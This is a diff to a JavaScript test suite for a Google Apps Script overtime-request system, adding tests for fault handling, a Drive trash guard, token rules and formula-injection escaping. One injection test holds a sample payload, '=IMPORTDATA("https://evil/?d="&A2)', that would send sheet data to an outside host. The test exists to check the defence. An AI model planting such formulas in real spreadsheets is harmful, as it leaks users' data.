@@ -121,6 +121,7 @@ function makeWorld(opts) {
   const log = [];
   const calls = [];
   const props = Object.assign({ SEBASTIAN_API_TOKEN: SEB_TOKEN, VPS_INTERNAL_TOKEN: VPS_TOKEN }, opts.props || {});
+  const propFaults = { readThrows: null, writeThrows: null }; // RegExp on the key: simulate quota / service errors
   const lockState = { free: opts.lockFree !== false, held: false };
   const db = new FakeSpreadsheet('DB1', {
     Settings: [['説明'], ['key', 'value', 'memo'],
@@ -152,8 +153,8 @@ function makeWorld(opts) {
     Logger: { log: m => log.push(String(m)) },
     JSON, Math, Date, Object, Array, String, Number, Boolean, RegExp, Error, Map, Set, isNaN, parseInt, parseFloat, encodeURIComponent, decodeURIComponent,
     PropertiesService: { getScriptProperties: () => ({
-      getProperty: k => (k in props ? props[k] : null),
-      setProperty: (k, v) => { props[k] = String(v); calls.push(['setProperty', k]); },
+      getProperty: k => { if (propFaults.readThrows && propFaults.readThrows.test(k)) throw new Error('Service error'); return k in props ? props[k] : null; },
+      setProperty: (k, v) => { if (propFaults.writeThrows && propFaults.writeThrows.test(k)) throw new Error('quota exceeded'); props[k] = String(v); calls.push(['setProperty', k]); },
       deleteProperty: k => { delete props[k]; },
       getProperties: () => Object.assign({}, props),
     }) },
@@ -169,7 +170,7 @@ function makeWorld(opts) {
       flush: () => {},
       getUi: () => ({ createMenu: () => { const m = { items: [], addItem: (a, b) => { m.items.push(b); return m; }, addSeparator: () => m, addToUi: () => { calls.push(['menu', m.items]); } }; return m; }, alert: () => {} }),
     },
-    Utilities: { formatDate, sleep: () => {} },
+    Utilities: { formatDate, sleep: () => {}, getUuid: () => require('crypto').randomUUID() },
     Session: {
       getActiveUser: () => ({ getEmail: () => users.active }),
       getEffectiveUser: () => ({ getEmail: () => users.effective }),
@@ -197,7 +198,23 @@ function makeWorld(opts) {
       getOAuthToken: () => 'tok',
       getScriptId: () => 'SCRIPT-ID-1',
     },
-    DriveApp: { getFileById: id => ({ setTrashed: () => { calls.push(['trash', id]); if (id === 'FOREIGN') throw new Error('no permission'); } }) },
+    // Drive: every file is a PDF in date folder F0 under PDF_ROOT_FOLDER_ID (ROOT1), except
+    // OUTSIDE (PDF in another tree, e.g. production PDF seen from staging), NOTPDF (a spreadsheet), DEEP (5 levels down).
+    DriveApp: { getFileById: id => {
+      calls.push(['getFileById', id]);
+      if (id === 'MISSING') throw new Error('No item with the given ID could be found');
+      const folder = (fid, parent) => ({ getId: () => fid, getParents: () => iter(parent ? [parent] : []) });
+      const iter = arr => { let i = 0; return { hasNext: () => i < arr.length, next: () => arr[i++] }; };
+      const root = folder('ROOT1', folder('MY-DRIVE'));
+      let parent = folder('F0', root);
+      if (id === 'OUTSIDE') parent = folder('PROD-DATE', folder('PROD-ROOT', folder('MY-DRIVE')));
+      if (id === 'DEEP') parent = folder('D4', folder('D3', folder('D2', folder('D1', root))));
+      return {
+        getMimeType: () => (id === 'NOTPDF' ? 'application/vnd.google-apps.spreadsheet' : 'application/pdf'),
+        getParents: () => iter([parent]),
+        setTrashed: () => { calls.push(['trash', id]); if (id === 'FOREIGN') throw new Error('no permission'); },
+      };
+    } },
     FormApp: { openById: id => { calls.push(['FormApp.openById', id]); const f = forms[id]; if (!f) throw new Error('no form');
       return { isAcceptingResponses: () => f.accepting, setAcceptingResponses: v => { f.accepting = v; calls.push(['setAccepting', id, v]); }, getResponses: () => [] }; } },
     CacheService: { getScriptCache: () => ({ get: () => null, put: () => {} }) },
@@ -227,7 +244,15 @@ function makeWorld(opts) {
   }
   ctx.generatePdfDirect_ = fakeGenerate('generatePdfDirect_');
   ctx.generatePdfForRequest_ = fakeGenerate('generatePdfForRequest_');
-  ctx.upsertAccumulationRow_ = id => calls.push(['upsertAccumulationRow_', id]);
+  // Like the real one: writes/overwrites the row keyed by requestId; swallows failures (opts.upsertSilentFail = writes nothing).
+  ctx.upsertAccumulationRow_ = id => {
+    calls.push(['upsertAccumulationRow_', id]);
+    if (opts.upsertSilentFail) return;
+    const req = ctx.getRequestById_(id);
+    const sh = ledger.sheets[(req.requestType === 'overtime' ? '残業' : '休日出勤') + '_2026年度'];
+    const n = sh.data.findIndex((r, i) => i > 0 && r[0] === id);
+    if (n < 0) sh.appendRow([id]);
+  };
   ctx.removeAccumulationRow_ = (id, t, d) => calls.push(['removeAccumulationRow_', id, t, ctx.fmtDate_(d, 'yyyy-MM-dd')]);
   ctx.appendToAccumulationSS_ = d => calls.push(['appendToAccumulationSS_', ctx.fmtDate_(d, 'yyyy-MM-dd')]);
   const realRebuild = ctx.rebuildAccumulationSS;
@@ -235,7 +260,7 @@ function makeWorld(opts) {
   ctx.rebuildAccumulationSS = () => { calls.push(['rebuildAccumulationSS']); return { rebuilt: true, processed: 12, sheets: 2, written: 12, backups: ['残業_2026年度_backup_x'], durationMs: 5 }; };
   ctx.batchGeneratePdfs_ = d => { calls.push(['batchGeneratePdfs_', ctx.fmtDate_(d, 'yyyy-MM-dd')]); return { ok: 2, skip: 1, fail: 1, errors: ['R-9 (加工班/X): boom'] }; };
 
-  return { ctx, db, ledger, props, calls, log, forms, lockState, get triggers() { return triggers; },
+  return { ctx, db, ledger, props, propFaults, calls, log, forms, lockState, get triggers() { return triggers; },
     post(obj) { const raw = typeof obj === 'string' ? obj : JSON.stringify(obj); const out = ctx.doPost({ postData: { contents: raw } }); return { raw: out.getContent(), json: JSON.parse(out.getContent()) }; },
     names(kind) { return calls.filter(c => c[0] === kind); },
     reqRow(id) { return ctx.getRequestById_(id); } };
@@ -421,17 +446,19 @@ test('afterDelete: trash old PDF, clear columns, remove ledger row', () => {
 });
 
 // --- morning batch
-test('vps.morningBatch: same 3 steps as morningBatchNoMail_, BatchLogs row, counts', () => {
+test('vps.morningBatch is disabled (data-safety low-4): bad_request, no BatchLogs row, nothing run', () => {
   const w = makeWorld();
   const r = w.post(vps('vps.morningBatch', { targetDate: '2026-11-25', jobId: 'mb1' })).json;
+  eq([r.ok, r.error, r.retryable], [false, 'bad_request', false]);
+  eq(w.db.sheets.BatchLogs, undefined, 'no BatchLogs tab/row');
+  eq(w.names('batchGeneratePdfs_').length + w.names('appendToAccumulationSS_').length, 0);
+});
+test('vpsMorningBatch_ (kept for manual use) still runs the same 3 steps as morningBatchNoMail_', () => {
+  const w = makeWorld();
+  w.ctx._vpsInternalCall_ = true;
+  const r = w.ctx.vpsMorningBatch_({ targetDate: '2026-11-25' });
   eq([r.ok, r.targetDate, r.counts, r.ledger.status], [true, '2026-11-25', { ok: 2, skip: 1, fail: 1 }, 'rewritten']);
-  const bl = w.db.sheets.BatchLogs.data;
-  eq(bl[0], ['実行日時', 'バッチ名', '対象日', '成功', 'スキップ', '失敗', 'エラー詳細']);
-  eq(bl[1].slice(1), ['morningBatchNoMail', '2026-11-25', 2, 1, 1, 'R-9 (加工班/X): boom']);
-  const order = w.calls.map(c => c[0]).filter(n => ['batchGeneratePdfs_', 'appendToAccumulationSS_'].includes(n));
-  eq(order, ['batchGeneratePdfs_', 'appendToAccumulationSS_']);
-  eq(w.post(vps('vps.morningBatch', { targetDate: '2026-11-25', jobId: 'mb1' })).json.replayed, true);
-  eq(w.db.sheets.BatchLogs.data.length, 2, 'replay does not add a 2nd BatchLogs row');
+  eq(w.db.sheets.BatchLogs.data[1].slice(1), ['morningBatchNoMail', '2026-11-25', 2, 1, 1, 'R-9 (加工班/X): boom']);
 });
 
 // --- migration mode
@@ -502,7 +529,8 @@ test('migration: internal vps.* still work (getDb_ allowed only inside authentic
   const p = w.post(vps('vps.ping')).json;
   eq([p.ok, p.migrationMode, p.migratedTo, p.dbId], [true, true, ORIGIN, 'DB1']);
   eq(w.post(vps('vps.renderPdf', { requestId: 'R-1', jobId: 'm1' })).json.pdf.status, 'created');
-  eq(w.post(vps('vps.morningBatch', { targetDate: '2026-11-25', jobId: 'm2' })).json.ok, true);
+  eq(w.post(vps('internal.batchPdf', { requestId: 'R-4', jobId: 'm2' })).json.ok, true);
+  eq(w.post(vps('internal.ledgerRewriteDay', { targetDate: '2026-11-25', jobId: 'm3' })).json.ok, true);
   throwsMatch(() => w.ctx.getDb_(), /新しいアドレスへ移りました/, 'flag reset after the call');
   eq(w.post(vps('vps.ping', { token: 'bad' })).json.error, 'unauthorized');
 });
@@ -519,7 +547,8 @@ test('migration: Sebastian actions forwarded verbatim to <origin>/api/sebastian;
     const out = w.post(raw);
     eq(out.raw, vpsBody, 'verbatim ' + action);
     const f = w.names('fetch').pop();
-    eq([f[1], f[2].method, f[2].payload, f[2].contentType], [ORIGIN + '/api/sebastian', 'post', raw, 'application/json']);
+    eq([f[1], f[2].method, f[2].payload, f[2].contentType, f[2].followRedirects, f[2].muteHttpExceptions, f[2].headers],
+      [ORIGIN + '/api/sebastian', 'post', raw, 'application/json', false, true, { 'X-Overtime-Forwarded': 'gas' }]);
   }
   // wrong token / invalid JSON are forwarded too (VPS answers with the same errors as GAS)
   w.post('{bad'); eq(w.names('fetch').pop()[2].payload, '{bad');
@@ -527,9 +556,11 @@ test('migration: Sebastian actions forwarded verbatim to <origin>/api/sebastian;
 });
 test('migration: forward network failure / non-200 -> today error shape {error, action}', () => {
   const w = migrated({ props: { SEBASTIAN_FORWARD_URL: ORIGIN + '/api/sebastian' }, fetch: { throws: 'DNS error' } });
-  eq(w.post({ token: SEB_TOKEN, action: 'completeOvertime', requestId: 'R-1' }).json, { error: 'forward failed: DNS error', action: 'completeOvertime' });
+  eq(w.post({ token: SEB_TOKEN, action: 'completeOvertime', requestId: 'R-1' }).json, { error: 'upstream unavailable: DNS error' }, 'spec 4-4');
   const w2 = migrated({ props: { SEBASTIAN_FORWARD_URL: ORIGIN + '/api/sebastian' }, fetch: { code: 502, body: '<html>' } });
-  eq(w2.post({ token: SEB_TOKEN, action: 'ping' }).json, { error: 'forward failed: HTTP 502', action: 'ping' });
+  eq(w2.post({ token: SEB_TOKEN, action: 'ping' }).json, { error: 'upstream error: 502' }, 'spec 4-4');
+  const w3 = migrated({ props: { SEBASTIAN_FORWARD_URL: ORIGIN + '/api/sebastian' }, fetch: { code: 200, body: '<html>challenge</html>' } });
+  eq(w3.post({ token: SEB_TOKEN, action: 'ping' }).json, { error: 'upstream error: 200' }, '200 but not JSON is not passed through');
 });
 
 // --- operator functions
@@ -654,6 +685,225 @@ test('batchPdf: existing pdfFileId -> skipped; PDF exception -> ok:true with pdf
   const r = w.post(vps('internal.batchPdf', { requestId: 'R-1', jobId: 'bp2' })).json;
   eq([r.ok, r.pdf.status, r.pdf.error], [true, 'error', 'PDFエクスポートに失敗しました: HTTP 500']);
   eq(w.names('upsertAccumulationRow_').length, 0);
+});
+
+// --- round 2 (review fixes)
+// security high-1: formula injection into the ledger / PDF template
+test('sheetLiteral_: = + - @ get a leading apostrophe; everything else unchanged', () => {
+  const w = makeWorld();
+  const L = w.ctx.sheetLiteral_;
+  eq(['=HYPERLINK("x","y")', '+1+2', '-5', '@a', ' =x', '加工班', 'その他\n=x', '', 60, null].map(v => L(v)),
+    ["'=HYPERLINK(\"x\",\"y\")", "'+1+2", "'-5", "'@a", ' =x', '加工班', 'その他\n=x', '', 60, null]);
+  const d = new Date('2026-11-25T03:00:00Z');
+  eq(L(d), d, 'Date untouched');
+});
+test('buildAccRow_: user text starting with = + - @ is written as literal text; normal rows identical', () => {
+  const w = makeWorld();
+  const base = { requestId: 'R-1', requestType: 'overtime', status: 'approved', dept: '加工班', workerName: '山田', workerCode: '001',
+    reason: '納期対応', reasonDetail: '', workContent: '検査', approvedMinutes: 60, pdfFileId: '' };
+  const d = new Date('2026-11-25T03:00:00Z');
+  const normal = w.ctx.buildAccRow_(Object.assign({}, base), {}, d);
+  eq(normal.slice(4, 10), ['加工班', '001', '山田', '納期対応', '', '検査'], 'normal values unchanged');
+  const evil = w.ctx.buildAccRow_(Object.assign({}, base, { dept: '=1', workerName: '@x', reason: '+A1',
+    reasonDetail: '-B2', workContent: '=IMPORTDATA("https://evil/?d="&A2)' }), {}, d);
+  eq(evil.slice(4, 10), ["'=1", '001', "'@x", "'+A1", "'-B2", "'=IMPORTDATA(\"https://evil/?d=\"&A2)"]);
+  eq(evil[0], 'R-1'); eq(evil[10], 60, 'numbers untouched');
+});
+test('fillPdfTemplate_: dept/name/workNo/workContent/reason written as literal text; normal values unchanged', () => {
+  const w = makeWorld();
+  w.ctx._vpsInternalCall_ = false;
+  const sheet = w.db.insertSheet('PDFTEST');
+  sheet.getColumnWidth = () => 100; sheet.getRowHeight = () => 20;
+  const reqData = { 'requestType(overtime/holiday)': 'overtime', targetDate: '2026-11-25', dept: '=1+1', workerName: '山田',
+    workNo1: '+81', workContent: '@SUM(A1)', reason: 'その他（→補足理由必須）', reasonDetail: '=HYPERLINK("x")', approvedMinutes: 60 };
+  const wl = { actualStartAt: '2026-11-25 17:20:00', actualEndAt: '2026-11-25 19:00:00', actualMinutes: 100, breakMinutes: 10, netMinutes: 90 };
+  w.ctx.fillPdfTemplate_(sheet, reqData, 'R-1', wl);
+  const cell = a1 => sheet.getRange(a1).getValue();
+  eq([cell('B4'), cell('D4'), cell('B18'), cell('A23'), cell('A29')],
+    ["'=1+1", '山田', "'+81", "'@SUM(A1)", 'その他\n=HYPERLINK("x")'], 'reason text starts with その他 -> unchanged');
+  const s2 = w.db.insertSheet('PDFTEST2');
+  w.ctx.fillPdfTemplate_(s2, Object.assign({}, reqData, { dept: '加工班', reason: '=x', reasonDetail: '' }), 'R-1', wl);
+  eq([s2.getRange('B4').getValue(), s2.getRange('A29').getValue()], ['加工班', "'=x"]);
+});
+test('XLOOKUP path writes the reason through sheetLiteral_ (source check)', () => {
+  const src = fs.readFileSync(path.join(SRC, 'pdfExport.gs'), 'utf8');
+  assert(src.includes('formSheet.getRange(PDF_MAP.reason).setValue(sheetLiteral_(reasonText));'), 'XLOOKUP reason');
+  const bare = src.match(/setValue\((normalize_\(reqData\['(dept|workerName)'\]\)|workNo|customer|product|workContent|reasonText|buildReasonText_\([^)]*\))\)/g);
+  eq(bare, null, 'no user-text setValue without sheetLiteral_');
+});
+
+// security mid-2 / data-safety high-1: trash only PDFs under PDF_ROOT_FOLDER_ID
+test('trash guard: PDF outside PDF_ROOT_FOLDER_ID is not trashed -> trashSkipped, regeneration continues', () => {
+  const w = makeWorld();
+  w.db.sheets.Requests.data[2][13] = 'OUTSIDE';
+  const r = w.post(vps('internal.regenerate', { requestId: 'R-2', jobId: 'tg1', args: { reason: 'secondary', oldPdfFileId: 'OUTSIDE' } })).json;
+  eq([r.ok, r.trash.status, r.trash.reason, r.trash.trashSkipped, r.trashSkipped, r.pdf.status], [true, 'skipped', 'outside_pdf_root', true, true, 'created']);
+  eq(w.names('trash').length, 0, 'setTrashed never called');
+});
+test('trash guard: non-PDF, too deep, missing PDF_ROOT_FOLDER_ID -> skipped; afterDelete with a foreign id -> skipped', () => {
+  const w = makeWorld();
+  const sh = w.db.sheets.Requests; sh.data[2][12] = ''; sh.data[2][13] = ''; sh.data[2][14] = '';
+  eq(w.post(vps('vps.renderPdf', { requestId: 'R-2', jobId: 'tg2', oldPdfFileId: 'NOTPDF' })).json.trash.reason, 'not_pdf');
+  eq(w.post(vps('internal.afterDelete', { requestId: 'R-X', jobId: 'tg3', args: { oldPdfFileId: 'DEEP', requestType: 'overtime', targetDate: '2026-11-25' } })).json.trash.reason, 'outside_pdf_root');
+  const r = w.post(vps('internal.afterDelete', { requestId: 'R-X', jobId: 'tg4', args: { oldPdfFileId: 'OUTSIDE', requestType: 'overtime', targetDate: '2026-11-25' } })).json;
+  eq([r.ok, r.trash.status, r.trashSkipped, r.ledger.status], [true, 'skipped', true, 'removed']);
+  eq(w.names('trash').length, 0);
+  const w2 = makeWorld();
+  w2.db.sheets.Settings.data[4][1] = '';
+  const r2 = w2.post(vps('internal.afterDelete', { requestId: 'R-2', jobId: 'tg5', args: { oldPdfFileId: 'OLDPDF' } })).json;
+  eq([r2.trash.status, r2.trash.reason], ['skipped', 'pdf_root_not_set']);
+  eq(w2.names('trash').length, 0);
+  eq(w2.reqRow('R-2').pdfFileId, '', 'sheet columns still cleared as today');
+});
+test('trash guard: PDF in a date folder under the root is trashed (2 levels); Drive error still reported as error', () => {
+  const w = makeWorld();
+  const r = w.post(vps('internal.afterDelete', { requestId: 'R-2', jobId: 'tg6', args: { oldPdfFileId: 'OLDPDF' } })).json;
+  eq([r.trash.status, r.trashSkipped], ['trashed', undefined]);
+  const r2 = w.post(vps('internal.afterDelete', { requestId: 'R-X', jobId: 'tg7', args: { oldPdfFileId: 'MISSING', requestType: 'overtime', targetDate: '2026-11-25' } })).json;
+  eq(r2.trash.status, 'error');
+});
+
+// security mid-2: workLog override range/format
+test('workLog override: bad format / out of range -> bad_request (not stored as retryable), nothing generated', () => {
+  const w = makeWorld();
+  const good = { actualStartAt: '2026-11-25 17:20:00', actualEndAt: '2026-11-25 19:00:00', actualMinutes: 100, breakMinutes: 10, netMinutes: 90 };
+  const bads = [
+    Object.assign({}, good, { actualEndAt: '19:00' }),
+    Object.assign({}, good, { actualStartAt: '2026-11-25T17:20:00Z' }),
+    Object.assign({}, good, { netMinutes: 1441 }),
+    Object.assign({}, good, { breakMinutes: -1 }),
+    Object.assign({}, good, { actualMinutes: '1e3' }),
+    Object.assign({}, good, { actualEndAt: '2026-11-25 17:00:00' }),
+    [good], 'x',
+  ];
+  bads.forEach((wl, i) => {
+    const r = w.post(vps('internal.afterComplete', { requestId: 'R-1', jobId: 'wv' + i, args: { source: 'screen', wlOverride: wl } })).json;
+    eq([r.ok, r.error, r.retryable], [false, 'bad_request', false], 'case ' + i);
+  });
+  eq(w.names('generatePdfDirect_').length + w.names('upsertAccumulationRow_').length, 0);
+  w.post(vps('internal.afterComplete', { requestId: 'R-1', jobId: 'wv-ok', args: { source: 'screen', wlOverride: Object.assign({}, good, { netMinutes: '90', extra: 'ignored' }) } }));
+  eq(w.names('generatePdfDirect_')[0][2], Object.assign({}, good, { netMinutes: 90 }), 'numeric string accepted; only the 5 keys passed');
+});
+
+// data-safety high-3 cooperation: ping reports migrated reliably and cheaply
+test('ping: migrated is always a boolean, read fresh every call (no stale cache)', () => {
+  const w = makeWorld();
+  const a = w.post(vps('internal.ping')).json;
+  eq([a.migrated, a.migrationMode], [false, false]);
+  w.props.MIGRATED_TO_URL = ORIGIN; // changed by the operator; per-execution cache must not hide it
+  const b = w.post(vps('internal.ping')).json;
+  eq([b.migrated, b.migrationMode, b.migratedTo], [true, true, ORIGIN]);
+  delete w.props.MIGRATED_TO_URL;
+  eq(w.post(vps('internal.ping')).json.migrated, false);
+});
+test('ping light: no DB open, returns migrated/scriptId/version only', () => {
+  const w = migrated();
+  const r = w.post(vps('internal.ping', { light: true })).json;
+  eq([r.ok, r.light, r.migrated, r.scriptId, r.apiVersion], [true, true, true, 'SCRIPT-ID-1', 1]);
+  eq(r.dbId, undefined); eq(w.names('getActive').length, 0, 'DB not opened');
+});
+test('ping: script properties unreadable for MIGRATED_TO_URL -> migrated:false + migratedReadError (VPS refuses writes)', () => {
+  const w = makeWorld({ props: { MIGRATED_TO_URL: ORIGIN } });
+  w.post(vps('internal.ping')); // token read works
+  w.propFaults.readThrows = /^MIGRATED_TO_URL$/;
+  const r = w.post(vps('internal.ping', { light: true })).json;
+  eq([r.migrated, r.migratedReadError], [false, true]);
+});
+
+// token rules
+test('internal token: 31 chars refused; 32 chars accepted; Sebastian path unaffected', () => {
+  const t31 = 'a'.repeat(31), t32 = 'b'.repeat(32);
+  const w = makeWorld({ props: { VPS_INTERNAL_TOKEN: t31 } });
+  eq(w.post({ token: t31, action: 'internal.ping' }).json.error, 'unauthorized');
+  eq(w.post({ token: SEB_TOKEN, action: 'ping' }).json.ok, true);
+  const w2 = makeWorld({ props: { VPS_INTERNAL_TOKEN: t32 } });
+  eq(w2.post({ token: t32, action: 'internal.ping' }).json.ok, true);
+});
+
+// data-safety mid-6: ledger upsert failure is detected
+test('ledger upsert silently failing -> ledger_upsert_failed retryable (upsertLedger) / ledger_failed (renderPdf), not stored', () => {
+  const w = makeWorld({ upsertSilentFail: true });
+  const r = w.post(vps('vps.upsertLedger', { requestId: 'R-1', jobId: 'lf1' })).json;
+  eq([r.ok, r.error, r.retryable, r.ledger.status], [false, 'ledger_upsert_failed', true, 'error']);
+  assert(!w.props.VPSJOB_lf1, 'not stored');
+  const a = w.post(vps('internal.afterApprove', { requestId: 'R-1', jobId: 'lf2' })).json;
+  eq([a.ok, a.error, a.retryable, a.pdf.status, a.ledger.status], [false, 'ledger_failed', true, 'created', 'error']);
+  assert(/^PDF-R-1-/.test(a.pdfFileId), 'PDF columns still returned so the VPS records them');
+  assert(!w.props.VPSJOB_lf2, 'not stored -> same jobId retried');
+});
+test('ledger upsert success is verified by reading the row back', () => {
+  const w = makeWorld();
+  eq(w.post(vps('vps.upsertLedger', { requestId: 'R-1', jobId: 'lv1' })).json.ledger.status, 'upserted');
+  eq(w.ledger.sheets['残業_2026年度'].data.filter(r => r[0] === 'R-1').length, 1);
+});
+
+// data-safety mid-3: idempotency store size and failure reporting
+test('idempotency: keeps at most 100 records; idempotencyStored true/false reported', () => {
+  const w = makeWorld();
+  for (let i = 0; i < 120; i++) w.props['VPSJOB_old' + i] = JSON.stringify({ t: Date.now() - 1000 + i, state: 'done', action: 'x', result: { ok: true } });
+  const r = w.post(vps('vps.upsertLedger', { requestId: 'R-1', jobId: 'is1' })).json;
+  eq(r.idempotencyStored, true);
+  const n = Object.keys(w.props).filter(k => k.startsWith('VPSJOB_')).length;
+  assert(n <= 101, 'records kept: ' + n);
+  assert(w.props.VPSJOB_is1, 'newest kept');
+  w.propFaults.writeThrows = /^VPSJOB_/;
+  const r2 = w.post(vps('vps.upsertLedger', { requestId: 'R-1', jobId: 'is2' })).json;
+  eq([r2.ok, r2.idempotencyStored], [true, false]);
+});
+test('idempotency: an oversized result is stored slim (<= 3000 chars) and still replays the PDF columns', () => {
+  const w = makeWorld({ pdfFail: {} });
+  const big = 'x'.repeat(5000);
+  w.ctx.generatePdfDirect_ = () => { throw new Error(big); };
+  const r = w.post(vps('internal.batchPdf', { requestId: 'R-1', jobId: 'big1' })).json;
+  eq([r.ok, r.pdf.status], [true, 'error']);
+  assert(w.props.VPSJOB_big1.length <= 3000, 'stored ' + w.props.VPSJOB_big1.length);
+  const rp = w.post(vps('internal.batchPdf', { requestId: 'R-1', jobId: 'big1' })).json;
+  eq([rp.replayed, rp.ok, rp.pdf.status, rp.requestId], [true, true, 'error', 'R-1']);
+});
+
+// data-safety mid-4: ledgerRebuild is never re-run with the same jobId after it started
+test('ledgerRebuild: a started-but-unfinished jobId is not re-run (stale or not); other actions still re-run after stale', () => {
+  const w = makeWorld();
+  w.props.VPSJOB_rbX = JSON.stringify({ t: Date.now() - 8 * 60 * 1000, state: 'running', action: 'internal.ledgerRebuild' });
+  const r = w.post(vps('internal.ledgerRebuild', { jobId: 'rbX' })).json;
+  eq([r.ok, r.error, r.retryable], [false, 'previous_attempt_unfinished', false]);
+  w.props.VPSJOB_rbY = JSON.stringify({ t: Date.now(), state: 'running', action: 'internal.ledgerRebuild' });
+  eq(w.post(vps('internal.ledgerRebuild', { jobId: 'rbY' })).json.error, 'busy');
+  eq(w.names('rebuildAccumulationSS').length, 0);
+  eq(w.post(vps('internal.ledgerRebuild', { jobId: 'rbZ' })).json.ok, true, 'new jobId runs');
+  w.props.VPSJOB_up = JSON.stringify({ t: Date.now() - 8 * 60 * 1000, state: 'running', action: 'vps.upsertLedger' });
+  eq(w.post(vps('vps.upsertLedger', { requestId: 'R-1', jobId: 'up' })).json.ok, true, 'stale running of other actions re-runs');
+});
+test('ledgerRebuild: a retryable failure keeps the running marker (no silent re-run)', () => {
+  const w = makeWorld();
+  w.ctx.rebuildAccumulationSS = () => ({ rebuilt: false, reason: 'timeout' });
+  const r = w.post(vps('internal.ledgerRebuild', { jobId: 'rbF' })).json;
+  eq([r.ok, r.retryable], [false, true]);
+  assert(w.props.VPSJOB_rbF && JSON.parse(w.props.VPSJOB_rbF).state === 'running', 'marker kept');
+});
+
+// editor-only secret/origin setters: never log or return the token value
+test('setInternalToken: generates 64 chars or takes a >=32-char argument; value never logged/returned; owner only', () => {
+  const w = makeWorld({ props: { VPS_INTERNAL_TOKEN: '' } });
+  const r = w.ctx.setInternalToken();
+  eq([r.saved, r.length, w.props.VPS_INTERNAL_TOKEN.length], [true, 64, 64]);
+  const given = 'Z'.repeat(40);
+  eq(w.ctx.setInternalToken(given), { saved: true, length: 40 });
+  eq(w.props.VPS_INTERNAL_TOKEN, given);
+  assert(!w.log.some(l => l.includes(given)) && !JSON.stringify(r).includes(w.props.VPS_INTERNAL_TOKEN), 'value not logged/returned');
+  throwsMatch(() => w.ctx.setInternalToken('short'), /32 字以上/);
+  throwsMatch(() => w.ctx.setInternalToken(SEB_TOKEN), /SEBASTIAN_API_TOKEN と別/);
+  assert(!w.log.some(l => l.includes(SEB_TOKEN)), 'refused value not logged');
+  eq(w.props.VPS_INTERNAL_TOKEN, given, 'unchanged after refusal');
+  throwsMatch(() => makeWorld({ users: { active: 'x@x' } }).ctx.setInternalToken(given), /スクリプトの持ち主/);
+  eq(w.post({ token: given, action: 'internal.ping' }).json.ok, true, 'works with the endpoint');
+});
+test('setVpsOrigin: validates https origin, stores VPS_ORIGIN, does not enter migration mode', () => {
+  const w = makeWorld();
+  eq(w.ctx.setVpsOrigin(ORIGIN + '/'), ORIGIN);
+  eq([w.props.VPS_ORIGIN, w.props.MIGRATED_TO_URL], [ORIGIN, undefined]);
+  throwsMatch(() => w.ctx.setVpsOrigin('http://x'), /https:\/\//);
+  eq(w.ctx.enterMigrationModeForOvertime(), ORIGIN);
 });
 
 // ---------------------------------------------------------------- report
